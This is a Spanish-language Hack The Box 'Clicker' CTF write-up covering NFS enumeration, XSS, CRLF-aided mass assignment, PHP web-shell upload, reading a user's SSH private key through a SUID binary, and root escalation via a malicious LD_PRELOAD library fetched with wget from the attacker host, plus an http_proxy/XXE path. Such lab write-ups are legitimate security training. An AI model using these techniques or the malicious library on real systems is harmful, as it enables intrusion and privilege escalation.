+++
author = "Andrés Del Cerro"
title = "Hack The Box: Clicker Writeup | Medium"
date = "2024-08-13"
description = ""
tags = [
    "HackTheBox",
    "Clicker",
    "Writeup",
    "Cybersecurity",
    "Penetration Testing",
    "CTF",
    "Reverse Shell",
    "Privilege Escalation",
    "RCE",
    "Exploit",
    "Linux",
    "Enumerating NFS",
    "Information Leakage",
    "XSS",
    "Mass Assignment Vulnerability",
    "CRLF Injection",
    "SQL Injection",
    "Web Shell",
    "Reversing Engineering",
    "Abusing SETENV",
    "Abusing LD_PRELOAD",
    "Abusing http_proxy",
    "XXE"
]

+++

# Hack The Box: Clicker Writeup

Welcome to my detailed writeup of the medium difficulty machine **"Clicker"** on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.

# TCP Enumeration

```shell
$ rustscan -a 10.129.244.53 --ulimit 5000 -g
10.129.244.53 -> [22,80,111,2049,34153,44465,45613,59011]
```

```shell
$ nmap -p22,80,111,2049,34153,44465,45613,59011 -sCV 10.129.244.53 -oN allPorts
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-13 19:16 CEST
Nmap scan report for 10.129.244.53
Host is up (0.037s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 89:d7:39:34:58:a0:ea:a1:db:c1:3d:14:ec:5d:5a:92 (ECDSA)
|_  256 b4:da:8d:af:65:9c:bb:f0:71:d5:13:50:ed:d8:11:30 (ED25519)
80/tcp    open  http     Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://clicker.htb/
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      50307/tcp6  mountd
|   100005  1,2,3      56563/udp6  mountd
|   100005  1,2,3      58331/udp   mountd
|   100005  1,2,3      59011/tcp   mountd
|   100021  1,3,4      34153/tcp   nlockmgr
|   100021  1,3,4      37231/tcp6  nlockmgr
|   100021  1,3,4      43295/udp   nlockmgr
|   100021  1,3,4      57855/udp6  nlockmgr
|   100024  1          43849/tcp6  status
|   100024  1          45440/udp   status
|   100024  1          45613/tcp   status
|   100024  1          49433/udp6  status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
34153/tcp open  nlockmgr 1-4 (RPC #100021)
44465/tcp open  mountd   1-3 (RPC #100005)
45613/tcp open  status   1 (RPC #100024)
59011/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.86 seconds
```

# UDP Enumeration
```shell
$ sudo nmap --top-ports 1500 -sU --min-rate 5000 -n -Pn 10.129.244.53 -oN allPorts.UDP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-13 19:17 CEST
Nmap scan report for 10.129.244.53
Host is up (0.037s latency).
Not shown: 1493 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
111/udp   open   rpcbind
998/udp   closed puparp
17205/udp closed unknown
21111/udp closed unknown
26191/udp closed unknown
31520/udp closed unknown
55544/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 1.22 seconds
```

En el servicio web del puerto 80 vemos una redirección a `clicker.htb` , lo agregamos al `/etc/hosts`
# NFS Enumeration
Interesante que se encuentre el NFS abierto, ya que me pareció extraño vamos a enumerarlo lo primero. 

Primero vamos a montar todo lo que se encuentre en el servidor.

```shell
$ sudo mount -t nfs 10.129.244.53:/ /mnt/montura
┌─[192.168.1.52]─[pointedsec@parrot]─[~/Desktop/clicker/scan]
└──╼ [★]$ ls -la /mnt/montura
total 8
drwxr-xr-x 18 root root 4096 sep  5  2023 .
drwxr-xr-x  1 root root   14 ago 13 19:20 ..
drwxr-xr-x  3 root root 4096 sep  5  2023 mnt
```

```shell
$ find . -type f
./mnt/backups/clicker.htb_backup.zip
```

Solo vemos un archivo .zip

![Write-up Image](images/Screenshot_1.png)
Contiene lo que parece archivos de un sitio web.

Analizando los archivos encontramos unas credenciales que quizás nos sirvan.
![Write-up Image](images/Screenshot_2.png)

`clicker_db_user:clicker_db_password`

Todavía no quiero meterme a analizar el código mas profundamente, primero vamos a ver la funcionalidad del aplicativo.

# HTTP Enumeration

## Multiple XSS
Así se ve el sitio web, parece una especie de juego en el navegador.
![Write-up Image](images/Screenshot_3.png)

Vemos que podemos visualizar mi perfil. Quizás se pueda acontecer un XSS aquí.
![Write-up Image](images/Screenshot_4.png)

Vemos que este es el juego, se basa en dar clicks y ir subiendo de nivele
![Write-up Image](images/Screenshot_5.png)

Al guardar la partida podemos manipular el mensaje de guardado y se produce un XSS.
![Write-up Image](images/Screenshot_6.png)

Vemos que para guardar la partida se hace una petición GET al recurso `save_game.php` y mediante los query params `clicks` y `level` indicamos el progreso.
![Write-up Image](images/Screenshot_7.png)

Haciendo una petición a `http://clicker.htb/save_game.php?clicks=120&level=120` vemos que se guarda el progreso, así que podemos modificar el progreso a nuestro gusto.

![Write-up Image](images/Screenshot_9.png)

Al autenticarnos erróneamente también podemos modificar el mensaje informativo y se acontece otro XSS.
![Write-up Image](images/Screenshot_8.png)

# Discovering SQL Injection | Mass Assignment Vulnerability
Si introducimos una `'` como clicks y niveles vemos que el servidor responde con un estado de error 500. Puede que este end-point sea vulnerable a SQL Injection. Como tenemos el código podemos revisarlo.
![Write-up Image](images/Screenshot_10.png)

Al revisar el código de `save_game.php` me encontré con algo mucho mas interesante.

Este código recorre todos parámetros y los pasa a una función que hará un `UPDATE` utilizando como campo a actualizar el parámetro que le pasemos. Pero tiene una pequeña protección para no poder cambiar el `role`
![Write-up Image](images/Screenshot_11.png)
![Write-up Image](images/Screenshot_12.png)

Vemos que por defecto el rol establecido a los usuarios es `User` , así que supongo que existirá el rol `Admin` o `Administrator`
![Write-up Image](images/Screenshot_13.png)

En principio no podemos modificar el rol pero si otros campos, eso es interesante.

Cambiando el `username` podemos conseguir otro XSS
![Write-up Image](images/Screenshot_14.png)

Cambiando el campo `nickname` y posteriormente revisando nuestro perfil también.
![Write-up Image](images/Screenshot_15.png)

Como alcancé un punto donde no encontraba nada, me puse a investigar sobre la condición para poder cambiar mi rol de usuario.

# CRLF Injection
Me encontré [este artículo en Hacktricks](https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a)

E inyectando un retorno de carro realmente no afectaría a la consulta SQL ya que a parte de que está sanitizada, se seguiría interpretando, pero ya no cumpliría la condición de que `%0d%arole === 'role'`
![Write-up Image](images/Screenshot_16.png)

Y nos hemos convertido administradores.
![Write-up Image](images/Screenshot_17.png)

Vemos una función para exportar una especie de reporte de los mejores jugadores.
![Write-up Image](images/Screenshot_18.png)

Así es como se ve el reporte.
![Write-up Image](images/Screenshot_19.png)

# Foothold
Y revisando el código de `export.php` descubrí una cosa crítica, y es que podemos controlar la extensión mediante el parámetro `extension`. Por lo cual..
![Write-up Image](images/Screenshot_20.png)
Podemos interceptar la petición con `burpsuite` y modificar el parámetro `extension` para establecer que queremos guardar un archivo php.
![Write-up Image](images/Screenshot_21.png)

Y vaya... Podemos crear archivos PHP.
![Write-up Image](images/Screenshot_22.png)

Ahora, si recordamos, podemos modificar cualquier campo mediante el recurso `save_game.php`...

El vector de ataque es editar el `nickname` de un usuario introduciendo un código PHP, para después crear un reporte en el que modificaremos la extensión para que sea PHP e interprete el código inyectado en el campo `nickname` y así conseguir ejecución remota de comandos.

Por lo cual, cambiamos el `nickname` para ver si nos carga el phpinfo.
![Write-up Image](images/Screenshot_23.png)

Creamos el reporte modificando la extensión..
![Write-up Image](images/Screenshot_25.png)

Y podemos crear nuestro propio archivo PHP, así que vamos a crear una web shell.
![Write-up Image](images/Screenshot_24.png)

Cambiamos el nickname...
![Write-up Image](images/Screenshot_26.png)

¡Y tenemos ejecución remota de comandos!
![Write-up Image](images/Screenshot_27.png)

Podemos comprobar que no estamos en ningún contenedor.
![Write-up Image](images/Screenshot_28.png)

Y con `pwncat-cs` nos podemos poner en escucha por el puerto 443 y mandarnos la revshell.

![Write-up Image](images/Screenshot_29.png)


![Write-up Image](images/Screenshot_30.png)

Todavía no podemos ver la flag, vemos que hay un usuario llamado `jack`
![Write-up Image](images/Screenshot_31.png)

## User Pivoting
Buscando por binarios con permisos SUID encontramos un binario un tanto extraño 
```shell
(remote) www-data@clicker:/var/www/clicker.htb/exports$ find / \-perm -4000 2>/dev/null
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/fusermount3
/usr/bin/su
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/mount
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/libexec/polkit-agent-helper-1
/usr/sbin/mount.nfs
/opt/manage/execute_query
```

```shell
(remote) www-data@clicker:/var/www/clicker.htb/exports$ ls -la /opt/manage/execute_query
-rwsrwsr-x 1 jack jack 16368 Feb 26  2023 /opt/manage/execute_query
```
Vemos que pertenece a `jack`

Podemos echar un vistazo con `ghidra` a este binario.
```C
undefined8 main(int param_1,long param_2)

{
  int iVar1;
  undefined8 uVar2;
  char *pcVar3;
  size_t sVar4;
  size_t sVar5;
  char *__dest;
  long in_FS_OFFSET;
  undefined8 local_98;
  undefined8 local_90;
  undefined4 local_88;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined8 local_60;
  undefined8 local_58;
  undefined8 local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined local_28;
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  if (param_1 < 2) {
    puts("ERROR: not enough arguments");
    uVar2 = 1;
  }
  else {
    iVar1 = atoi(*(char **)(param_2 + 8));
    pcVar3 = (char *)calloc(0x14,1);
    switch(iVar1) {
    case 0:
      puts("ERROR: Invalid arguments");
      uVar2 = 2;
      goto LAB_001015e1;
    case 1:
      strncpy(pcVar3,"create.sql",0x14);
      break;
    case 2:
      strncpy(pcVar3,"populate.sql",0x14);
      break;
    case 3:
      strncpy(pcVar3,"reset_password.sql",0x14);
      break;
    case 4:
      strncpy(pcVar3,"clean.sql",0x14);
      break;
    default:
      strncpy(pcVar3,*(char **)(param_2 + 0x10),0x14);
    }
    local_98 = 0x616a2f656d6f682f;
    local_90 = 0x69726575712f6b63;
    local_88 = 0x2f7365;
    sVar4 = strlen((char *)&local_98);
    sVar5 = strlen(pcVar3);
    __dest = (char *)calloc(sVar5 + sVar4 + 1,1);
    strcat(__dest,(char *)&local_98);
    strcat(__dest,pcVar3);
    setreuid(1000,1000);
    iVar1 = access(__dest,4);
    if (iVar1 == 0) {
      local_78 = 0x6e69622f7273752f;
      local_70 = 0x2d206c7173796d2f;
      local_68 = 0x656b63696c632075;
      local_60 = 0x6573755f62645f72;
      local_58 = 0x737361702d2d2072;
      local_50 = 0x6c63273d64726f77;
      local_48 = 0x62645f72656b6369;
      local_40 = 0x726f77737361705f;
      local_38 = 0x6b63696c63202764;
      local_30 = 0x203c20762d207265;
      local_28 = 0;
      sVar4 = strlen((char *)&local_78);
      sVar5 = strlen(pcVar3);
      pcVar3 = (char *)calloc(sVar5 + sVar4 + 1,1);
      strcat(pcVar3,(char *)&local_78);
      strcat(pcVar3,__dest);
      system(pcVar3);
    }
    else {
      puts("File not readable or not found");
    }
    uVar2 = 0;
  }
```

Resumidamente este código hace lo siguiente:
### 1. **Revisión de Argumentos**:

- El código verifica si el número de argumentos (`param_1`) es menor que 2. Si es así, imprime un mensaje de error y termina el programa con un código de retorno 1.
- Si el número de argumentos es suficiente, convierte el segundo argumento en un entero usando `atoi()`.

### 2. **Asignación de Nombre de Archivo**:

- Dependiendo del valor del entero `iVar1`, que se obtiene del segundo argumento, selecciona un nombre de archivo SQL predeterminado:
    - `1` → "create.sql"
    - `2` → "populate.sql"
    - `3` → "reset_password.sql"
    - `4` → "clean.sql"
    - Cualquier otro valor usará el tercer argumento proporcionado (`*(char **)(param_2 + 0x10)`) como nombre de archivo.


Es decir, que como segundo argumento podemos poner lo que sea y de tercer argumento podemos poner un archivo y el binario leerá este archivo y lo reportará por pantalla y como este binario debido al permiso SUID lo está ejecutando `jack` podríamos intentar leer archivos de este usuario.

Primero vamos a leer el `/etc/passwd` para comprobar que esto es así.

```shell
(remote) www-data@clicker:/var/www/clicker.htb/exports$ /opt/manage/execute_query 2123123 ../../../etc/passwd
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
.........
```
Y funciona. Tener en cuenta que este archivo lo hemos leido como `jack`

Por alguna razón no podía leer la id_rsa.

```shell
(remote) www-data@clicker:/var/www/clicker.htb/exports$ /opt/manage/execute_query 2123 ../../../home/jack/.ssh/id_rsa
mysql: [Warning] Using a password on the command line interface can be insecure.
ERROR: Can't initialize batch_readline - may be the input source is a directory or a block device.
```


Probando un rato por alguna razón probando `../.ssh/id_rsa` pude leer la clave privada de `jack`

```shell
(remote) www-data@clicker:/var/www/clicker.htb/exports$ /opt/manage/execute_query 21 ../.ssh/id_rsa
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
-----BEGIN OPENSSH PRIVATE KEY---
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
-----END OPENSSH PRIVATE KEY---
--------------

ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '-----BEGIN OPENSSH PRIVATE KEY---
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAA' at line 1
```

Ahora que tenemos la clave privada de `jack` podemos iniciar sesión por SSH como este usuario

```shell
$ chmod 600 id_rsa 
┌─[192.168.1.52]─[pointedsec@parrot]─[~/Desktop/clicker/content]
└──╼ [★]$ ssh -i id_rsa jack@clicker.htb
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-84-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Aug 13 04:52:32 PM UTC 2024

  System load:           0.00439453125
  Usage of /:            53.3% of 5.77GB
  Memory usage:          19%
  Swap usage:            0%
  Processes:             247
  Users logged in:       0
  IPv4 address for eth0: 10.129.244.53
  IPv6 address for eth0: dead:beef::250:56ff:fe94:b37a


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Aug 13 16:52:33 2024 from 10.10.14.85
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

jack@clicker:~$ whoami
jack
```

Y podríamos leer la flag
```shell
ack@clicker:~$ cat user.txt 
d97427a66f43a70a...
```

# Privilege Escalation

Podemos observar que `jack` puede ejecutar cualquier comando como el usuario que el quiera pero necesitamos la credencial de `jack`, cosa que no tenemos.

Además podemos ejecutar como root y sin contraseña el script `/opt/monitor.sh`
```shell
jack@clicker:~$ sudo -l
Matching Defaults entries for jack on clicker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User jack may run the following commands on clicker:
    (ALL : ALL) ALL
    (root) SETENV: NOPASSWD: /opt/monitor.sh

```

También detectamos que este usuario pertenece al grupo `adm` por lo cual podríamos leer algunos logs en `/var/log`

No podemos modificar este script.
```shell
-rwxr-xr-x 1 root root 504 Jul 20  2023 /opt/monitor.sh
```

Ejecutando este script nos devuelve un fichero XML
```XML 
<?xml version="1.0"?>
<data>
  <timestamp>1723571776</timestamp>
  <date>2024/08/13 05:56:16pm</date>
  <php-version>8.1.2-1ubuntu2.14</php-version>
  <test-connection-db>OK</test-connection-db>
  <memory-usage>392704</memory-usage>
  <environment>
    <APACHE_RUN_DIR>/var/run/apache2</APACHE_RUN_DIR>
    <SYSTEMD_EXEC_PID>1173</SYSTEMD_EXEC_PID>
    <APACHE_PID_FILE>/var/run/apache2/apache2.pid</APACHE_PID_FILE>
    <JOURNAL_STREAM>8:26796</JOURNAL_STREAM>
    <PATH>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</PATH>
    <INVOCATION_ID>9d410bb08fb8413485c944cf3e9f9476</INVOCATION_ID>
    <APACHE_LOCK_DIR>/var/lock/apache2</APACHE_LOCK_DIR>
    <LANG>C</LANG>
    <APACHE_RUN_USER>www-data</APACHE_RUN_USER>
    <APACHE_RUN_GROUP>www-data</APACHE_RUN_GROUP>
    <APACHE_LOG_DIR>/var/log/apache2</APACHE_LOG_DIR>
    <PWD>/</PWD>
  </environment>
</data>
```

```bash
#!/bin/bash
if [ "$EUID" -ne 0 ]
  then echo "Error, please run as root"
  exit
fi

set PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
unset PERL5LIB;
unset PERLLIB;

data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);
/usr/bin/xml_pp <<< $data;
if [[ $NOSAVE == "true" ]]; then
    exit;
else
    timestamp=$(/usr/bin/date +%s)
    /usr/bin/echo $data > /root/diagnostic_files/diagnostic_${timestamp}.xml
fi
```

- - Usa `curl` para realizar una solicitud HTTP a `http://clicker.htb/diagnostic.php?token=secret_diagnostic_token`, guardando el resultado en la variable `data`. La opción `-s` (silent) suprime la salida de progreso y errores de `curl`.
- **Formatea y muestra los datos XML**:
    
    - El comando `/usr/bin/xml_pp` (una utilidad Perl para formatear y mostrar XML) se usa para formatear los datos obtenidos de la URL.
- **Condicional para guardar los datos**:
    
    - Si la variable de entorno `NOSAVE` está establecida en `"true"`, el script se detiene (`exit`).
    - Si `NOSAVE` no está en `"true"`, el script obtiene una marca de tiempo (`timestamp`) utilizando el comando `date +%s`, que proporciona el número de segundos desde el Epoch (1 de enero de 1970).
    - Finalmente, guarda los datos obtenidos en un archivo XML dentro del directorio `/root/diagnostic_files/`, nombrando el archivo con el formato `diagnostic_<timestamp>.xml`.

Si ejecutamos otra vez el `sudo -l` vemos que tenemos el parámetro `SETENV`

```shell
(root) SETENV: NOPASSWD: /opt/monitor.sh
```

Esto significa que podemos inyectar variables de entorno que se pasarán en tiempo de ejecución al script.
No podemos hacer un path hijacking ya que vemos que se está reemplazando el PATH dentro del script pero podemos hacer mas cosas.

Buscando un poco en Google podemos encontrar el [siguiente artículo](https://systemweakness.com/linux-privilege-escalation-with-ld-preload-sudo-a13e0b755ede)
![Write-up Image](images/Screenshot_32.png)

Aquí entra en juego la variable de entorno `LD_PRELOAD`

> **What is LD_PRELOAD ?**
> 
> Ans : **LD_PRELOAD** is an optional Environment Variable that is used to set/load Shared Libraries to a program or script. That means we can set the value of the **LD_PRELOAD** Environment Variable for a program to tell the program to load the mentioned libraries in it’s memory before starting.


Y el artículo dicta que debemos revisar si tenemos permiso para establecer variables de entorno (si) y si tenemos establecido `env_keep += LD_PRELOAD` en el archivo `/etc/sudoers` . Pero que si tenemos el parámetro `SETENV` es suficiente.

> Enumerate to see if we have permission to set the environment variable for the script or program. In this case we see that we can SETENV which means the same. Also see if the `env_keep += LD_PRELOAD` is set here or in the sudoers file. In this case we don’t see that but the SETENV is enough.

Por lo cual podemos realizar esta escalada de privilegios creando una librería compartida maliciosa que ejecutará un comando a nivel de sistema. Esta librería se cargará cuando ejecutemos con sudo el script que hemos detectado.

La máquina víctima no tiene `gcc` así que me va a tocar compilarlo en mi máquina de atacante.
```shell
jack@clicker:/tmp$ which gcc
jack@clicker:/tmp$
```

Entonces creamos la librería compartida maliciosa.

```C
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setuid(0);
        setgid(0);
        system("/bin/bash -p");
}
```

La compilamos...

```shell
$ gcc -fPIC -shared -nostartfiles -o evil.so evil.c
evil.c: In function ‘_init’:
evil.c:7:9: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    7 |         setuid(0);
      |         ^~~~~~
evil.c:8:9: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    8 |         setgid(0);
      |         ^~~~~~
┌─[192.168.1.52]─[pointedsec@parrot]─[~/Desktop/clicker/content]
└──╼ [★]$ ls -la evil.so
-rwxr-xr-x 1 pointedsec pointedsec 14152 ago 13 22:19 evil.so
```

Nos la pasamos a la máquina víctima
```shell
jack@clicker:/tmp$ wget http://10.10.14.85:8081/evil.so
--2024-08-13 18:20:20--  http://10.10.14.85:8081/evil.so
Connecting to 10.10.14.85:8081... connected.
HTTP request sent, awaiting response... 200 OK
Length: 14152 (14K) [application/octet-stream]
Saving to: ‘evil.so’

evil.so                100%[==========================>]  13.82K  --.-KB/s    in 0.04s   

2024-08-13 18:20:20 (371 KB/s) - ‘evil.so’ saved [14152/14152]
```


Y ahora si cargamos nuestra librería compartida maliciosa en memoria del programa 
estableciendo la variable d entorno `LD_PRELOAD`...

```shell
jack@clicker:/tmp$ sudo LD_PRELOAD=/tmp/evil.so /opt/monitor.sh
root@clicker:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

Y podríamos leer la flag
```shell
root@clicker:/tmp# cat /root/root.txt
afbf7c61dbdb7fa331...
```

# Privilege Escalation -> The intented path
El camino que había que tomar para completar esta máquina no era el que hemos tomado en este write-up.

Si no que como se está utilizando `curl` podemos establecer la variable de entorno `http_proxy` aprovechándonos del `SETENV` para poder modificar los datos que se envían al recurso `diagnostic.php` y de esta manera poder forzar un XML External Entity Injection (XXE) y de esta forma leer la `id_rsa` de `root` y conectarnos por SSH como `root`

Podemos empaparos un poco de la documentación sobre esta variable de entorno.
https://everything.curl.dev/usingcurl/proxies/env.html

Así que primero, en `burpsuite` vamos a editar nuestro proxy y establecer que esté en escucha por todas las interfaces.
![Write-up Image](images/Screenshot_33.png)

Y ahora si nos ponemos a interceptar las solicitudes y ejecutamos el script estableciendo la variable de entorno `http_proxy` a nuestro proxy de la máquina atacante.

```shell
jack@clicker:/tmp$ sudo http_proxy=http://10.10.14.85:8080 /opt/monitor.sh
```

Nos llega la petición y podemos modificarla.
![Write-up Image](images/Screenshot_34.png)

Hay que entender también lo que está pasando pro detrás, y es que el script primero hace una solicitud a `diagnostic.php` cuya respuesta no podemos controlar, pero eso nos da igual, lo que nos importa es poder modificar la respuesta que recibe el cliente, no la que nos ofrece el recurso `diagnostic.php`

Ya que esta respuesta se pasa a la utilidad `/usr/bin/xml_pp` que es donde podemos hacer que se acontezca el XXE.

Por lo cual, al interceptar la petición interceptamos también la respuesta...
![Write-up Image](images/Screenshot_35.png)

Y aquí vamos a inyectar el XXE
![Write-up Image](images/Screenshot_36.png)

![Write-up Image](images/Screenshot_37.png)

Y si le damos a `Forward`...
Vemos que se carga el `/etc/passwd`
![Write-up Image](images/Screenshot_38.png)

Como la data se está pasando a la utilidad `xml_pp` como `root`, podemos hacer que el XXE cargue la clave privada de `root` para intentar iniciar sesión por SSH.

Por lo cual repetimos el proceso pero modificamos el XXE.
![Write-up Image](images/Screenshot_39.png)

Y obtenemos la clave privada de `root`.
![Write-up Image](images/Screenshot_40.png)

Y ya podemos conectarnos como `root` utilizando su clave privada.

```shell
jack@clicker:/tmp$ nano id_rsa
jack@clicker:/tmp$ chmod 600 id_rsa 
